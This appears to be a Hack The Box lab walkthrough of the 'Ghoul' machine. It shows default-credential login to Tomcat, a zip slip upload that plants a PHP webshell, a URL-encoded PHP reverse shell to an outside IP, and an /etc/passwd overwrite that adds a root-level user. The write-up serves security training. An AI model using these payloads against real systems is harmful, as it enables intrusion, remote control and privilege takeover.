## open ports
- port 22 = ssh 
- port 80 = http website
- port 2222 = another ssh 
- port 8080 = tomcat

## enumerating the tomcat

Browsing to port 8080 asks for a username/password. Trying some default combinations reveals that `admin:admin` is the right choice. 
On this application you can upload images and zip files which is interesting.
An idea is to create a zip file with a [zip slip](https://security.snyk.io/research/zip-slip-vulnerability) vulnerablility and upload it to the server. 
Because there is an apache webserver you can assume it takes files from `/var/www/html`. 
So you can take a php webshell like: 
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```
and zip it with `zip shell.zip ../../../../../../../../../var/www/html/shell.php`

This ensures that the zip files gets unzipped at the given directory.

## playing around with the webshell

By browsing to `10.10.10.101/shell.php` the webserver responds with the usage guide which indicates that the webshell is working. 
This is because we set the directory to `/var/www/html` which is the default directory for the apache webserver. 

So now we can execute commands on the target system by sending them as GET parameter in the URL. 
Testing it with `10.10.10.101/shell.php?cmd=cat+/etc/passwd` reveals the passwd file. 

To establish a reverse shell you can now set up a listener and browse to `10.10.10.101/shell.php?cmd=php+-r+'$sock%3dfsockopen("10.10.15.22",4000)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'` (note the url encodeing)

## get user from www-data

Looking around you can notice that our `shell.php` was created by root. This means that the unzip was executed with root privileges which comes in handy. 
```
-rw-r--r-- 1 root root    328 Sep 28 07:52 shell.php
```

So we can create a new user with root privileges by extending the `/etc/passwd` file. 

To create a password for a new user we can use `openssl passwd AAAA` where AAAA is the password. 
We create a new passwd file on our local maschine with the entrys of the target and append a new user with the created password.

```

1. Get rid of the `<pre>` tags
2. Make a backup of your current `/etc/passwd` file and move your created passwd file there
3. zip the new `/etc/passwd` with `zip passwd.zip ../../../../../../../../etc/passwd` and upload the zip created zip file
4. Restore your old passwd file 

> If there are problems with your user because you aren't part of the sudoers anymore use `su` to become root

```bash
mv /etc/passwd /etc/passwd.old
mv ~/HTB/Ghoul/passwd /etc/passwd
zip passwd.zip ../../../../../../../../etc/passwd
mv /etc/passwd.old /etc/passwd
```

Now on the target maschine you can `su hacker` and type the created password `AAAA`. 

The user flag is in `kaneki`'s home directory
